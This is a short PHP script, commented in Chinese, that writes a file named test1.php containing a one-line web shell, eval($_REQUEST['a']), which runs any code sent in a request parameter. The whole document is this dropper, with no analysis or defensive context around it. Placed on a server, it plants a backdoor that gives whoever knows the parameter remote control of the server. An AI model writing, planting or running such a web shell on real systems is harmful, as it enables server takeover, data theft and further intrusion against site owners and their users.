<?php
//当前路径下生成test1.php文件
$test='<?php eval($_REQUEST["a"]);?>';
file_put_contents('test1.php',$test);
?>